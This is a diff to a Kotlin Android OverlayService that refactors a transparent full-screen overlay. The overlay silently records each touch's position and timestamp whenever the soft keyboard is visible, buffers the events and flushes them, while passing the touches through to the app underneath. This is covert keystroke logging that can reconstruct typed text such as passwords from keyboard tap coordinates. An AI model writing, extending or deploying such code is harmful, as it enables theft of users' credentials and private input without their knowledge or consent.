@@ -24,8 +24,9 @@ import java.io.IOException
 class OverlayService : Service() {
 
     private lateinit var windowManager: WindowManager
-    private var combinedOverlayView: FrameLayout? = null
+    private var overlayView: FrameLayout? = null
     private var screenHeight: Int = 0
+    private var isKeyboardVisible = false
 
     private val handler = Handler(Looper.getMainLooper())
     private val eventBuffer = mutableListOf<String>()
@@ -55,8 +56,7 @@ class OverlayService : Service() {
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            val windowMetrics = windowManager.currentWindowMetrics
-            screenHeight = windowMetrics.bounds.height()
+            screenHeight = windowManager.currentWindowMetrics.bounds.height()
         } else {
             @Suppress("DEPRECATION")
             val displayMetrics = DisplayMetrics()
@@ -64,62 +64,59 @@ class OverlayService : Service() {
             windowManager.defaultDisplay.getMetrics(displayMetrics)
             screenHeight = displayMetrics.heightPixels
         }
-        addCombinedOverlayView()
+        addOverlayView()
     }
 
-    private fun addCombinedOverlayView() {
-        combinedOverlayView = FrameLayout(this)
+    private fun addOverlayView() {
+        overlayView = FrameLayout(this)
         val params = WindowManager.LayoutParams(
             WindowManager.LayoutParams.MATCH_PARENT,
             WindowManager.LayoutParams.MATCH_PARENT,
             WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            // Start as NOT_FOCUSABLE (to pass keyboard focus) and NOT_TOUCHABLE (to be inert)
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+            // View is now touchable from the start, but not focusable.
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
             PixelFormat.TRANSPARENT
         )
 
-        combinedOverlayView?.setOnApplyWindowInsetsListener { view, insets ->
-            val isKeyboardVisible = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        overlayView?.setOnApplyWindowInsetsListener { _, insets ->
+            val keyboardIsCurrentlyVisible = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 insets.isVisible(WindowInsets.Type.ime())
             } else {
                 @Suppress("DEPRECATION")
-                val bottomInset = insets.systemWindowInsetBottom
-                bottomInset > screenHeight * 0.25
+                insets.systemWindowInsetBottom > screenHeight * 0.25
             }
 
-            val currentParams = view.layoutParams as WindowManager.LayoutParams
-            if (isKeyboardVisible) {
-                // Keyboard is visible: Make overlay touchable
-                currentParams.flags = currentParams.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
-                view.setOnTouchListener { _, event -> handleTouchEvent(event) }
-            } else {
-                // Keyboard is hidden: Make overlay inert again
-                currentParams.flags = currentParams.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
-                view.setOnTouchListener(null)
-                flushEventBuffer() // Flush any remaining events
+            if (this.isKeyboardVisible && !keyboardIsCurrentlyVisible) {
+                // Keyboard was visible and is now hidden, flush the buffer.
+                flushEventBuffer()
             }
-            windowManager.updateViewLayout(view, currentParams)
+            this.isKeyboardVisible = keyboardIsCurrentlyVisible
 
             insets
         }
-        windowManager.addView(combinedOverlayView, params)
+
+        // Set the touch listener from the beginning.
+        overlayView?.setOnTouchListener { _, event -> handleTouchEvent(event) }
+        windowManager.addView(overlayView, params)
     }
 
     private fun handleTouchEvent(event: MotionEvent): Boolean {
-        val action = when (event.action) {
-            MotionEvent.ACTION_DOWN -> "DOWN"
-            MotionEvent.ACTION_UP -> "UP"
-            MotionEvent.ACTION_MOVE -> "MOVE"
-            else -> ""
+        // Only record events if the keyboard is visible.
+        if (isKeyboardVisible) {
+            val action = when (event.action) {
+                MotionEvent.ACTION_DOWN -> "DOWN"
+                MotionEvent.ACTION_UP -> "UP"
+                MotionEvent.ACTION_MOVE -> "MOVE"
+                else -> ""
+            }
+            if (action.isNotEmpty()) {
+                val eventData = "$action,${event.rawX},${event.rawY},${System.currentTimeMillis()}"
+                synchronized(eventBuffer) { eventBuffer.add(eventData) }
+                resetFlushTimer()
+            }
         }
-        if (action.isNotEmpty()) {
-            val eventData = "$action,${event.rawX},${event.rawY},${System.currentTimeMillis()}"
-            synchronized(eventBuffer) { eventBuffer.add(eventData) }
-            resetFlushTimer()
-        }
-        return false // Pass the touch event on to the window below
+        // ALWAYS return false to pass the touch to the window below.
+        return false
     }
 
     private fun resetFlushTimer() {
@@ -164,7 +161,7 @@ class OverlayService : Service() {
         super.onDestroy()
         flushRunnable?.let { handler.removeCallbacks(it) }
         flushEventBuffer()
-        combinedOverlayView?.let { windowManager.removeView(it) }
+        overlayView?.let { windowManager.removeView(it) }
     }
 
     private fun createNotification(): Notification {
